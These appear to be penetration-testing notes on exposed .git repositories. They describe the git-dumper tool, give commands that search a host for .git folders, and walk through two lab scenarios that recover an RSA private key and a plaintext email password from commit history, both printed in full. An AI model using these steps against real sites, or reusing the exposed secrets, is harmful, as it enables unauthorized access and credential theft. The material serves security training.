@@ -1,1 +1,212 @@
+Download .git with git-dumper
+https://pypi.org/project/git-dumper/
+
+git-dumper
+A tool to dump a git repository from a website.
+Install
+This can be installed easily with pip:
+pip install git-dumper
+
+Usage
+usage: git-dumper [options] URL DIR
+Dump a git repository from a website.
+positional arguments:
+  URL                   url
+  DIR                   output directory
+
+optional arguments:
+  -h, --help            show this help message and exit
+  --proxy PROXY         use the specified proxy
+  -j JOBS, --jobs JOBS  number of simultaneous requests
+  -r RETRY, --retry RETRY
+                        number of request attempts before giving up
+  -t TIMEOUT, --timeout TIMEOUT
+                        maximum time in seconds before giving up
+  -u USER_AGENT, --user-agent USER_AGENT
+                        user-agent to use for requests
+  -H HEADER, --header HEADER
+                        additional http headers, e.g `NAME=VALUE`
+
+Example
+git-dumper http://website.com/.git ~/website
+
+mkdir <DESTINATION_FOLDER>
+./gitdumper.sh <URL>/.git/ <DESTINATION_FOLDER>
+
+How does it work?
+The tool will first check if directory listing is available. If it is, then it will just recursively download the .git directory (what you would do with wget).
+If directory listing is not available, it will use several methods to find as many files as possible. Step by step, git-dumper will:
+
+    Fetch all common files (.gitignore, .git/HEAD, .git/index, etc.);
+    Find as many refs as possible (such as refs/heads/master, refs/remotes/origin/HEAD, etc.) by analyzing .git/HEAD, .git/logs/HEAD, .git/config, .git/packed-refs and so on;
+    Find as many objects (sha1) as possible by analyzing .git/packed-refs, .git/index, .git/refs/* and .git/logs/*;
+    Fetch all objects recursively, analyzing each commits to find their parents;
+    Run git checkout . to recover the current working tree
+
+
+.git
+Any .git files?
+find / -type d -name '.git' 2>/dev/null
+PS C:\Users\mute> Get-ChildItem -Path C:\ -Include *.git -File -Recurse -ErrorAction SilentlyContinue ← Search for .git files
+dir /s /b /a:d | findstr ".git$"
+
+Scenario 1:
+Identify git repo
+In poking around mute's home directory, I noticed a git repo (a .git folder). I decided to look for .git repositories on the host:
+mute@gitter:~$ find / -type d -name '.git' 2>/dev/null
+/home/mute/work/blogfeed/.git
+
+Check History
+Looking more closely at the git repo, use git to check the current status:
+roosa@gitter:~/work/blogfeed$ git status
+On branch master
+Your branch is up-to-date with 'origin/master'.
+Untracked files:
+  (use "git add <file>..." to include in what will be committed)
+
+        src/.feed.py.swp
+        src/access.log
+        src/app.py
+        src/app.py~
+        src/config.py
+        src/devsolita-snapshot.png
+        src/feed.log
+        src/feed.pyc
+        src/save.p
+
+nothing added to commit but untracked files present (use "git add" to track)
+
+Also look at the git history. I’ll use --name-only to get list of the files that changed in each commit, and --oneline to reduce space:
+mute@gitter:~/work/blogfeed$ git log --name-only --oneline
+7ff507d Use Base64 for pickle feed loading
+src/feed.py
+src/index.html
+26ae6c8 Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.
+run-gunicorn.sh
+src/feed.py
+cec54d8 Debug support added to make development more agile.
+run-gunicorn.sh
+src/feed.py
+ca3e768 Blogfeed app, initial version.
+src/feed.py
+src/index.html
+src/upload.html
+dfebfdf Gunicorn startup script
+run-gunicorn.sh
+33e87c3 reverted accidental commit with proper key
+resources/integration/authcredentials.key
+d387abf add key for feed integration from tnerprise backend
+resources/integration/authcredentials.key
+1422e5a Initial commit
+README.md
+
+Get SSH Key From Commit
+That message is interesting: reverted accidental commit with proper key, just after add key for feed integration from enterprise backend. There’s also only one file changed between those two commits, resources/integration/authcredentials.key.
+It’d be possible to see the key by just running git diff 1422e5a d387abf, seeing the difference between the two commits.
+But it’d be more interesting to checkout the file from the past commit. Watch the md5 value of the key as I make changes. First, check the value before any changes:
+
+mute@gitter:~/work/blogfeed$ md5sum resources/integration/authcredentials.key
+f57f7e28835e631c37ad0d090ef3b6fd  resources/integration/authcredentials.key
+
+Now checkout the version from the old commit:
+
+roosa@gitter:~/work/blogfeed$ git checkout d387abf -- resources/integration/authcredentials.key
+roosa@gitter:~/work/blogfeed$ md5sum resources/integration/authcredentials.key
+d880df0f57e4143a0fcb46fdd76e270b  resources/integration/authcredentials.key
+roosa@gitter:~/work/blogfeed$ cat resources/integration/authcredentials.key
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
+8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
+vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
+nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
+CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
+F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
+uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
+gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
+k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
+NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
+HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
+2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
+GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
+jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
+IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
++XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
+7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
+Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
+iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
+VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
+S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
+md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
+LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
+oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
+LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
+-----END RSA PRIVATE KEY-----
+
+Once I’m done, I’ll clean up by reverting back to the last commit:
+
+mute@gitter:~/work/blogfeed$ git reset --hard 7ff507d
+HEAD is now at 7ff507d Use Base64 for pickle feed loading
+mute@gitter:~/work/blogfeed$ md5sum resources/integration/authcredentials.key
+f57f7e28835e631c37ad0d090ef3b6fd  resources/integration/authcredentials.key
+
+commands:
+git log
+git show
+git diff
+
+
+Scenario 2:
+C:\muted\.git>dir
+  Directory of C:\muted\.git
+
+10/20/2022  02:01 AM    <DIR>          ..
+10/20/2022  02:07 AM                34 COMMIT_EDITMSG
+10/20/2022  02:01 AM               130 config
+10/20/2022  02:01 AM                73 description
+10/20/2022  02:01 AM                23 HEAD
+10/20/2022  02:01 AM    <DIR>          hooks
+10/20/2022  02:07 AM            91,178 index
+10/20/2022  02:01 AM    <DIR>          info
+10/20/2022  02:06 AM    <DIR>          logs
+10/20/2022  02:07 AM    <DIR>          objects
+10/20/2022  02:01 AM    <DIR>          refs
+
+C:\muted\.git\logs>dir
+  Directory of C:\muted\.git\logs
+
+10/20/2022  02:06 AM    <DIR>          .
+10/20/2022  02:07 AM               293 HEAD
+10/20/2022  02:06 AM    <DIR>          refs
+
+type HEAD   <----- To view commits
+git show 8b430c17c16e6c0515e49c4eafdd129f719fde74   <---- The commit Number 
+
+C:\staging\.git\logs>type HEAD
+0000000000000000000000000000000000000000 967fa71c359fffcbeb7e2b72b27a321612e3ad11 damian <damian> 1666256797 -0700      commit (initial): V1
+967fa71c359fffcbeb7e2b72b27a321612e3ad11 8b430c17c16e6c0515e49c4eafdd129f719fde74 damian <damian> 1666256862 -0700      commit: Email config not required anymore
+
+C:\staging\.git\logs>git show 8b430c17c16e6c0515e49c4eafdd129f719fde74
+commit 8b430c17c16e6c0515e49c4eafdd129f719fde74 (HEAD -> master)
+Author: mollie 
+Date:   Thu Oct 20 02:07:42 2022 -0700
+
+    Email config not required anymore
+
+diff --git a/htdocs/cms/data/email.conf.bak b/htdocs/cms/data/email.conf.bak
+deleted file mode 100644
+index 77e370c..0000000
+--- a/htdocs/cms/data/email.conf.bak
++++ /dev/null
+@@ -1,5 +0,0 @@
+-Email configuration of the CMS
+-molliemail@straylight.com:Password123! <-- Credentials found via git show
+-
+-If something breaks contact finn@straylight.com as he is responsible for the mail server.
+
+
+
+
+
+
+
 
